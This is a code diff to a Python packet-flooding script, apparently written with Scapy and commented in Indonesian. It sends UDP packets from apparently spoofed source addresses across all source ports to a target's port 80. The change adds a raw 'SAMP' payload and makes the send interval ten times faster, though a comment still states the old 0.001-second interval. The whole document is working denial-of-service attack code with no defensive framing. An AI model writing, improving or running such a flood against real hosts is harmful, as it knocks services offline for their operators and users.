@@ -13,10 +13,11 @@ while True:
     source_IP = a + dot + b + dot + c + dot + d
 
     for source_port in range(1, 65535):
+        payload = "SAMP"  # Ganti payload sesuai dengan yang Anda inginkan
         IP1 = IP(src=source_IP, dst=target_IP)
         UDP1 = UDP(sport=source_port, dport=80)
-        pkt = IP1 / UDP1
-        send(pkt, inter=0.001)
+        pkt = IP1 / UDP1 / Raw(load=payload)
+        send(pkt, inter=0.0001, verbose=False)  # Mengirimkan dengan interval 0.001 detik
 
         print("Paket terkirim", i)
         i = i + 1
